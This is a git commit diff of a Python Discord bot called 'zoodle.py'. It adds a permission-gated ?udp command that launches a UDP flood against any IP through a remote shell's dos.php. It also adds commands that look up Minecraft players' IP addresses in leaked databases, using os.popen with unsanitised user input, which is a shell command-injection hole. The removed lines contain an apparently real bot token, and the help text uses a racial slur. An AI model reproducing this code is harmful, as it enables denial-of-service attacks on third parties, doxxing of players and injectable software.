e4b66540c1544c48fcfc219e29185b3bb93eefb7
cupofndlz <cupndlz@gmail.com>
2017-07-05 14:12:14 -0700

    Update zoodle.py

--- zoodle.py
+++ zoodle.py
@@ -1,6 +1,8 @@
 import discord
 import json
 import requests
+import os
+import sys
 from discord.ext.commands import Bot
 from discord.ext import commands
 
@@ -15,11 +17,46 @@ async def on_ready():
 	print("ID: {}".format(client.user.id))
 	await client.change_presence(game=discord.Game(name='?commands for help'))
 
+#Variables
+TOKEN = "" #Paste token here
+authUsers = ['Noodles#8431', 'Cringeson#9529', '_xEverettx_#7806']
+
 
 #Help Menu (?help)
 @client.command(pass_context=True)
 async def commands(ctx):
-	await client.say("Welcome to ZoodleC0rpz Official Discord Bot\n?commands - Dank shit nigga\n?oldnames - minecraf oldname lookup(?oldnames USERNAME)\n?udp - DOS tool used to lightly toast routers(?udp IP SECONDS)\n?resolve - IP Resolver that finds LOCATION of IP(?resolve IP)\n?bark - Like ping but... better\n?daddy - Whos ur daddy 0.o")
+	await client.say(
+"""Welcome to ZoodleC0rpz Official Discord Bot
+?commands - dank shIet nigga
+?mcresolve - (?mcresolve <IGN>) Resolve ip of username
+?oldnames - (?oldnames <IGN>) Looks up old names of username
+?udp - (?udp <IP> <TIME> <PORT>) Denial of Service attack using layer 4
+?bark - Like ping but better
+?daddy - Who's your daddy o.0
+""")
+
+#Discord Tag
+@client.command(pass_context=True)
+async def tester(ctx):
+	messageAuthor = str(ctx.message.author)
+	if messageAuthor in authUsers:
+		await client.say("Is Authorized")
+	else:
+		await client.say("Not Authorized")
+
+#lifeboat sg search
+@client.command(pass_context=True)
+async def lbsg(ctx, query):
+	results = os.popen("grep -w \"" + query +"\" /media/danesh/External/sketch/DATABASES/db.txt").read()
+	await client.say(results)
+#Minecraft Resolver
+@client.command(pass_context=True)
+async def mcresolve(ctx, mcign):
+	dboutput = os.popen("grep -w \"" + mcign + "\" kobirocks.txt").read()
+	if dboutput.count("\n") > 0:
+		await client.say(dboutput)
+	else:
+		await client.say("No Results Found! Try Resolving old names.")
 
 #Minecraft Name History (?oldnames <username>)
 @client.command(pass_context=True)
@@ -40,14 +77,17 @@ async def oldnames(ctx, username):
 #Sends UDP Flood (?udp <IP> <TIME(SEC)>)
 @client.command(pass_context=True)
 async def udp(ctx, ip, time):
-	if(int(time) > 60):
-		await client.say("You can only toast for 60 seconds!")
+	messageAuthor = str(ctx.message.author)
+	if messageAuthor in authUsers:
+		if(int(time) > 60):
+			await client.say("You can only toast for 60 seconds!")
+		else:
+			await client.say("Attempting to toast " + ip + " for " + time + " seconds!")
+			url = "http://YOURSHELLIP/dos.php?host=" + ip + "&time=" + time + "&type=UDP"
+			requests.get(url)
+			await client.say("Successfully toasted " + ip + "'s router")
 	else:
-		await client.say("Attempting to toast " + ip + " for " + time + " seconds!")
-		url = "http://YOURSHELLHERE/dos.php?host=" + ip + "&time=" + time + "&type=UDP"
-		requests.get(url)
-		await client.say("Successfully toasted " + ip + "'s router")
-
+		await client.say("You're not sexy enough, contact Noodles#8431 for perms")
 #Resolve IP (?resolve <ip>)
 @client.command(pass_context=True)
 async def resolve(ctx, ip):
@@ -66,5 +106,4 @@ async def daddy(ctx):
 	await client.say("Papi Noodles")
 
 
-client.run("MzI3OTg2NjQzNzc0NDcyMTkz.DC9eTQ.QmNX8VrpZMIm9FKqFoZIXuMIg2k")
-
+client.run(TOKEN)
